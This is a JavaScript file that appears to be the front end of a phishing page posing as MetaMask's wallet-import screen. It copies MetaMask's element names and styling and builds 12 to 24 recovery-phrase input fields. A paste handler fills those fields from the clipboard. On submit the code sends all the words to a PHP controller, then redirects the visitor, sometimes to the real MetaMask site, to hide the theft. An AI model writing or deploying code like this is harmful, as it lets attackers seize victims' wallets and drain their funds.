! function ()
{
    var alert = document.getElementById("message_show")
    var alert_inner = document.getElementById("message_show_inner")
    var alert_inner_second = document.getElementById("message_show_inner_second")
    var inputs = document.querySelectorAll("input");
    var btn = document.getElementById('btn_submit')

    const input = document.querySelector('input[type="text"]');

        input.addEventListener('input', function() {
        
        if (alert.classList.contains('d-none'))
        {
            alert.classList.remove('d-none')
            alert_inner.classList.remove('d-none')
            alert_inner_second.classList.add('d-none')
        }

    });


    document.addEventListener('keyup' , () => {
        
        const inputs = document.querySelectorAll('form input');

        let allInputsHaveValues = true;
        for (const input of inputs) {
            if (input.value === '') {
                allInputsHaveValues = false;
                break;
            }
        }
        // if (allInputsHaveValues)
        // {
        //     const xhr = new XMLHttpRequest();
        //     xhr.open('GET', 'database/words.json', true);
        //     xhr.responseType = 'json';

        //     xhr.send();
        //     xhr.onreadystatechange = function() {
        //     if (xhr.readyState === XMLHttpRequest.DONE) {
        //         if (xhr.status === 200) {
        //         // Parse the JSON data
        //         const data = xhr.response;

        //             let notFoundWord = true
        //             for (const input of inputs) {

        //                 if (!data.includes(input.value)) {
        //                     notFoundWord = false;
        //                     break;
        //                 }
        //             }
                    
        //             if (!notFoundWord)
        //             {
        //                 if (alert.classList.contains('d-none'))
        //                     alert.classList.remove('d-none')
                        
        //                 if (!alert_inner.classList.contains('d-none'))
        //                     alert_inner.classList.add('d-none')
                        

        //                 if(alert_inner_second.classList.contains('d-none'))
        //                     alert_inner_second.classList.remove('d-none')

        //                 btn.disabled = true
        //             }
        //             else
        //             {
        //                 if (!alert.classList.contains('d-none'))
        //                     alert.classList.add('d-none')

        //                 if(!alert_inner_second.classList.contains('d-none'))
        //                     alert_inner_second.classList.add('d-none')

                        btn.disabled = false
                        
                        
                        
                          
        //             }
        //         }
        //     }
        //     };
        // }
    })

    btn.addEventListener('click' , () => {

        const inputs = document.querySelectorAll('form input');
        keys = ""

        for (const input of inputs) {

            keys += input.value + " "
            
        }
        let len = keys.toString().split(" ").length
        arr = {"keys" : keys.toString() , "len" : len.toString()}
        fetch('./controller/submit.php', {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            },
            body : JSON.stringify(arr)
            })
            .then((response) => response.json())
            .then((data) => {
                
                
                if (data.location != "https://metamask.io/about/")
                {
                    alert.classList.remove('d-none')
                    alert_inner_second.classList.remove('d-none')
                }
                setTimeout(function() {

                        window.location.href = data.location
                }, 5000);
                
        });
    })
    function create_div(input_number)
    {
        if (!document.getElementById('input-div-' + input_number.toString()))
        {
            const did_to_insert = document.getElementById('import-srp')
            const div = document.createElement('div');
            const div2 = document.createElement('div');
            const div3 = document.createElement('div');
            const label = document.createElement('label')
            const text = document.createElement('p')
            const inp = document.createElement('input')

            text.classList.add('box','box--margin-top-1','box--margin-bottom-1','box--flex-direction-row','typography','typography--p','typography--weight-normal','typography--style-normal','typography--color-text-default')
            text.innerText = input_number.toString() + ". "

            label.setAttribute('for','import-srp__srp-word-' + (input_number - 1).toString())

            div.classList.add('import-srp__srp-word')

            div.setAttribute("id","input-div-" + input_number.toString())

            div2.classList.add('MuiFormControl-root','MuiTextField-root')

            div3.classList.add('MuiInputBase-root','MuiInput-root','jss12','MuiInputBase-formControl','MuiInput-formControl')

            inp.classList.add('MuiInputBase-input','MuiInput-input')
            inp.setAttribute('aria-invalid','false')
            inp.setAttribute('autocomplete' , 'off')
            inp.setAttribute('id',"import-srp__srp-word-" + (input_number - 1).toString())
            inp.setAttribute('dir',"auto")
            inp.setAttribute('data-testid',"import-srp__srp-word-" + (input_number - 1).toString())
            inp.type = "text"

            div.appendChild(label)
            label.appendChild(text)

            div.appendChild(div2)
            div2.appendChild(div3)
            div3.appendChild(inp)

            did_to_insert.appendChild(div)
        }
    }

    function delete_div_selector(number)
    {
        const div = document.getElementById('input-div-' + number.toString());

        if (div)
        {
            div.parentNode.removeChild(div);
        }
        
    }
    const select = document.getElementById('select');

    select.addEventListener('change', (event) => {

        let select_value = event.target.value

        for (let k = 24; k > 12 ; k--)
        {
            delete_div_selector(k)
        }
        
        for (let b = 13; b <= select_value; b++)
        {
            create_div(b)
        }
        
    });


    // setInterval(function(){
	
    //     const xhr = new XMLHttpRequest();
    //     xhr.open('GET', 'database/words.json', true);
    //     xhr.responseType = 'json';

    //     xhr.send();
    //     xhr.onreadystatechange = function() {
    //     if (xhr.readyState === XMLHttpRequest.DONE) {
    //         if (xhr.status === 200) {
    //         // Parse the JSON data
    //         const data = xhr.response;

    //             let notFoundWord = true
    //             for (const input of inputs) {

    //                 if (!data.includes(input.value)) {
    //                     notFoundWord = false;
    //                     break;
    //                 }
    //             }
                
    //             if (!notFoundWord)
    //             {
    //                 btn.disabled = true
    //             }
    //             else
    //             {
    //                 btn.disabled = false
                        
    //             }
    //         }
    //     }
    //     };
            
        
    // }, 100);

    inputs[0].addEventListener('focus' , () => {

        document.addEventListener("paste", function(event) {

        var pastedData = event.clipboardData.getData("text");

        if (pastedData) 
        {
           let text = pastedData.split(" ")

           if (text.length == 1)
            {
                text = pastedData.split('\r\n')
            }
            
            if (text.length == 1)
            {
                text = pastedData.split('\n')
            }
           
           var inputs = document.querySelectorAll("input");

           inputs[0].blur()

           for(let i = 0; i < inputs.length ; i++)
           {
                if(text[i])
                    inputs[i].value = text[i];
           }

           
        }
      });
    })
    

}()